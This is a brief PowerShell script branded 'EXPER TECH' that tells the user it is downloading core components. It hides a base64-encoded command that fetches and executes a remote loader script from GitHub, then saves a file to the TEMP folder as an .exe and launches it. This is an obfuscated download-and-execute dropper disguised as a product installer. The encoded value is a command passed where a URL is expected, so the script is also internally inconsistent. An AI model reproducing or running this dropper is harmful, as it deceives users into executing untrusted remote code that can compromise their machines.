# 
Write-Host "E X P E R  T E C H" -ForegroundColor Cyan

# 
$Url = "aQBlAHgAKABpAHIAbQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwB6AHUAaQBhAGkAeABpAHgAaQBiAGEAbwBiAGUAaQAtAG0AYQB4AC8AWgBBAEwAUwAvAGIAbABvAGIALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
$Path = "$env:TEMP\EXPER_Core.exe"

Write-Host "[>] Downloading core components..." -ForegroundColor Gray
Invoke-WebRequest -Uri $Url -OutFile $Path

# 
Start-Process $Path
